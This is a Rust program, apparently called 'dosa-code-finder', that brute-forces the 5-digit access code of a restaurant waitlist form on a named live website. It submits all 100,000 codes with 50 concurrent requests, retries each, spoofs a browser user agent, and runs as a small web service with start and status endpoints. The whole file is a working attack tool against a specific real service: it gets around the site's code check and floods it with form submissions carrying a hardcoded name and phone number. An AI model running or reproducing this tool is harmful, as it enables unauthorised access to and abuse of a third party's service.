//! Brute-forces a 5-digit restaurant code against checktodine.com's waitlist
//! endpoint. Mirrors the prior Node.js implementation:
//!   - 100,000 codes (00000..99999)
//!   - 50 concurrent in-flight requests
//!   - 10 retries with exponential backoff per code
//!   - Body sniff for "Restaurant Code is not valid." → not valid; anything
//!     else means we found a hit
//!   - First success short-circuits the rest of the scan via an atomic flag

use axum::extract::State;
use axum::routing::get;
use axum::Router;
use futures::stream::{self, StreamExt};
use reqwest::Client;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tower_http::cors::CorsLayer;

const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
const MAX_CONCURRENT: usize = 50;
const INVALID_MARKER: &str = "Restaurant Code is not valid.";

#[derive(Clone)]
struct AppState {
    client: Client,
    is_running: Arc<AtomicBool>,
    code_found: Arc<AtomicBool>,
    trial_code: Arc<Mutex<String>>,
    valid_code: Arc<Mutex<String>>,
}

/// POST one code attempt. Returns true iff the response body does NOT
/// contain the invalid marker — meaning the code was accepted.
async fn submit(state: AppState, code: String) -> bool {
    if state.code_found.load(Ordering::Relaxed) {
        return false;
    }

    let form = [
        ("RestaurantCode", code.as_str()),
        ("WaitListName", "Hari"),
        ("WaitListPhone", "6504057400"),
        ("WaitListAdults", "1"),
        ("WaitListKids", ""),
        ("WaitListMessage", ""),
        ("SaveBooking", "  ＋ Add  "),
    ];

    let mut retries: u32 = 10;
    let mut wait_ms: u64 = 100;

    loop {
        if state.code_found.load(Ordering::Relaxed) {
            return false;
        }
        let body_res = state
            .client
            .post(TARGET_URL)
            .header("User-Agent", USER_AGENT)
            .form(&form)
            .send()
            .await
            .and_then(|r| r.error_for_status());
        match body_res {
            Ok(resp) => match resp.text().await {
                Ok(body) => {
                    let success = !body.contains(INVALID_MARKER);
                    {
                        let mut tc = state.trial_code.lock().await;
                        *tc = code.clone();
                    }
                    if success {
                        let mut vc = state.valid_code.lock().await;
                        *vc = code.clone();
                        state.code_found.store(true, Ordering::Relaxed);
                        println!("Found valid code: {code}");
                    }
                    return success;
                }
                Err(_) => {
                    if retries == 0 {
                        return false;
                    }
                    retries -= 1;
                    tokio::time::sleep(Duration::from_millis(wait_ms)).await;
                    wait_ms *= 2;
                }
            },
            Err(_) => {
                if retries == 0 {
                    return false;
                }
                retries -= 1;
                tokio::time::sleep(Duration::from_millis(wait_ms)).await;
                wait_ms *= 2;
            }
        }
    }
}

async fn try_all(state: AppState) {
    // is_running acts as a lock — bail if a scan is already in flight.
    if state.is_running.swap(true, Ordering::Relaxed) {
        return;
    }
    state.code_found.store(false, Ordering::Relaxed);

    let codes: Vec<String> = (0..100_000u32).map(|i| format!("{i:05}")).collect();
    println!("starting scan of {} codes", codes.len());

    stream::iter(codes)
        .for_each_concurrent(MAX_CONCURRENT, |code| {
            let st = state.clone();
            async move {
                let _ = submit(st, code).await;
            }
        })
        .await;

    state.is_running.store(false, Ordering::Relaxed);
    let valid = state.valid_code.lock().await.clone();
    let found = state.code_found.load(Ordering::Relaxed);
    println!("scan finished. found={found} valid={valid}");
}

async fn status_handler(State(state): State<AppState>) -> String {
    let running = state.is_running.load(Ordering::Relaxed);
    let trial = state.trial_code.lock().await.clone();
    let valid = state.valid_code.lock().await.clone();
    let found = state.code_found.load(Ordering::Relaxed);
    format!(
        "{}\ntrial code: {trial}\nvalid code: {valid}\nfound code: {found}",
        if running { "Running" } else { "Not running" }
    )
}

async fn start_handler(State(state): State<AppState>) -> &'static str {
    if state.is_running.load(Ordering::Relaxed) {
        return "Running";
    }
    tokio::spawn(async move {
        try_all(state).await;
    });
    "Started"
}

async fn root_handler() -> &'static str {
    "up."
}

#[tokio::main]
async fn main() {
    let port: u16 = std::env::var("PORT")
        .ok()
        .and_then(|p| p.parse().ok())
        .unwrap_or(3000);

    // Match the prior Node.js setup as closely as possible:
    //   https.Agent({ keepAlive: true, maxSockets: 1000 })
    //
    // Specifically: force HTTP/1.1 so concurrent requests use distinct TCP
    // sockets (HTTP/2 would multiplex 50 logical requests over a single
    // socket and the upstream processes them ~sequentially). Pool a lot of
    // idle sockets so we never pay a fresh TLS handshake during the scan.
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .http1_only()
        .pool_max_idle_per_host(1000)
        .pool_idle_timeout(Duration::from_secs(90))
        .tcp_keepalive(Duration::from_secs(60))
        .user_agent(USER_AGENT)
        .build()
        .expect("build reqwest client");

    let state = AppState {
        client,
        is_running: Arc::new(AtomicBool::new(false)),
        code_found: Arc::new(AtomicBool::new(false)),
        trial_code: Arc::new(Mutex::new("null".to_string())),
        valid_code: Arc::new(Mutex::new("null".to_string())),
    };

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/start", get(start_handler))
        .route("/status", get(status_handler))
        .layer(CorsLayer::permissive())
        .with_state(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    println!("dosa-code-finder listening on {addr}");
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

